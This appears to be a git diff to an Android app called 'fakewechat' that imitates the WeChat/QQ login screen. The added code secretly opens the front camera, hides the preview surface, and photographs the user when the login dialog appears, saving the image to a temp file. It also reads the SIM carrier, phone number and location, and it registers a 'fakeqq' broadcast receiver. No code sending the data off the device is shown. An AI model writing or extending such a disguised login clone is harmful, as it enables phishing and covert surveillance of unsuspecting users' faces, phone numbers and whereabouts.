@@ -1,28 +1,74 @@
 package com.example.fakewechat
 
 import android.app.AlertDialog
-import android.app.Dialog
-import android.content.Context
+
 import android.graphics.Color
-import android.opengl.Visibility
+import android.hardware.Camera
+
 import android.support.v7.app.AppCompatActivity
 import android.os.Bundle
-import android.support.v4.view.ViewCompat
-import android.view.Window.ID_ANDROID_CONTENT
+
 import android.os.Build
 import android.text.Editable
 import android.text.TextWatcher
 import android.view.*
 import android.view.View.*
 import kotlinx.android.synthetic.main.activity_main.*
-import android.view.KeyEvent.KEYCODE_BACK
+
 import android.widget.Toast
 import java.util.*
+import android.content.Intent
+import android.content.IntentFilter
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
+import android.util.Log
+import android.widget.Button
+import java.io.BufferedOutputStream
+import java.io.File
+import java.io.FileOutputStream
+import java.text.SimpleDateFormat
+
+import java.io.IOException
+import android.view.SurfaceHolder
+import android.view.SurfaceView
+
+
 
 
 class MainActivity : AppCompatActivity() {
 
+
+
     var QQLogin_Type = false;
+
+
+
+    private lateinit var camera: Camera;
+    private val cpHolderCallback = object : SurfaceHolder.Callback {
+        override fun surfaceCreated(holder: SurfaceHolder) {
+            startPreview()
+        }
+
+        override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {
+
+        }
+
+        override fun surfaceDestroyed(holder: SurfaceHolder) {
+            stopPreview()
+        }
+    }
+
+    override fun onResume() {
+        super.onResume()
+
+
+        sfv_preview.holder.addCallback(cpHolderCallback);
+        Log.i("camera","test")
+
+        registerReceiver(MyBroadcastReceiver(), IntentFilter("com.example.fakeqq.MY_BROADCAST"))
+    }
+
+
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -35,7 +81,7 @@ class MainActivity : AppCompatActivity() {
                 WindowManager.LayoutParams. FLAG_FULLSCREEN);
 */
 
-
+        //设置通知栏透明
         window.requestFeature(Window.FEATURE_NO_TITLE)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             val window = window
@@ -49,6 +95,8 @@ class MainActivity : AppCompatActivity() {
         }
 
         setContentView(R.layout.activity_main)
+
+        MessageCollector.setMyContext(applicationContext);
 
 
 
@@ -96,7 +144,9 @@ class MainActivity : AppCompatActivity() {
 
         })
 
+
         buttonChange.setOnClickListener({
+            sfv_preview.visibility = INVISIBLE
             QQLogin_Type = !QQLogin_Type;
             if (QQLogin_Type){
                 Tv_title.text = "微信号/QQ号/邮箱登陆";
@@ -134,6 +184,59 @@ class MainActivity : AppCompatActivity() {
             var alert =  mDialog.create();
             alert.show();
 
+            //拍照,0标示前置摄像头，1表示后置摄像头
+
+            Log.i("test","here")
+
+//            var camera = Camera.open(0);
+
+/*            camera.takePicture(null, null, object :Camera.PictureCallback{
+                override fun onPictureTaken(data: ByteArray, p1: Camera?) {
+                    var path = ""
+
+                    Log.i("test","here2")
+                    var bitmap = BitmapFactory.decodeByteArray(data, 0, data.size);
+
+                    Log.i("test",""+data.size)
+                    //自定义文件保存路径  以拍摄时间区分命名
+                    var filepath = "/" + SimpleDateFormat("yyyyMMddHHmmss").format(Date()) +  ".jpg";
+                    var file = File(filepath);
+                    var  bos = BufferedOutputStream(FileOutputStream(file));
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 100, bos);//将图片压缩的流里面
+                    bos.flush();// 刷新此缓冲区的输出流
+                    bos.close();// 关闭此输出流并释放与此流有关的所有系统资源
+
+
+                    bitmap.recycle();//回收bitmap空间
+
+                    Toast.makeText(this@MainActivity, "保存照片失败", Toast.LENGTH_SHORT).show()
+                }
+
+            })*/
+
+
+
+
+            camera.takePicture(null, null, Camera.PictureCallback { data, camera ->
+                var path = saveFile(data)
+                if (path != null) {
+
+
+                } else {
+                    Toast.makeText(this@MainActivity, "保存照片失败", Toast.LENGTH_SHORT).show()
+                }
+            })
+            Log.i("test","here3")
+            //Sim卡信息
+            Toast.makeText(this@MainActivity,
+                    "运营商："+MessageCollector.getProvidersName()+",手机号："+MessageCollector.getNativePhoneNumber()
+                    ,Toast.LENGTH_SHORT).show();
+
+            //位置信息
+            Toast.makeText(this@MainActivity,
+                    MessageCollector.getLocation()
+                    ,Toast.LENGTH_SHORT).show();
+
 
            var timer = Timer();
             timer.schedule(object :TimerTask(){
@@ -170,6 +273,50 @@ class MainActivity : AppCompatActivity() {
 
     }
 
+
+    //保存临时文件的方法
+    private fun saveFile(bytes: ByteArray): String {
+        try {
+            val file = File.createTempFile("img"+SimpleDateFormat("yyyy-MM-dd-HH-mm-ss").format(Date()), "")
+            val fos = FileOutputStream(file)
+            fos.write(bytes)
+            fos.flush()
+            fos.close()
+            return file.absolutePath
+        } catch (e: IOException) {
+            e.printStackTrace()
+        }
+
+        return ""
+    }
+
+
+    //开始预览
+    private fun startPreview() {
+        Log.i("camera","start")
+
+        camera = Camera.open(1)
+
+        try {
+
+            camera.setPreviewDisplay(sfv_preview.holder)
+            camera.setDisplayOrientation(90)   //让相机旋转90度
+            camera.startPreview()
+        } catch (e: IOException) {
+            e.printStackTrace()
+        }
+
+    }
+
+    //停止预览
+    private fun stopPreview() {
+        Log.i("camera","stop")
+/*
+        camera.stopPreview()
+        camera.release()
+*/
+
+    }
 
 }
 
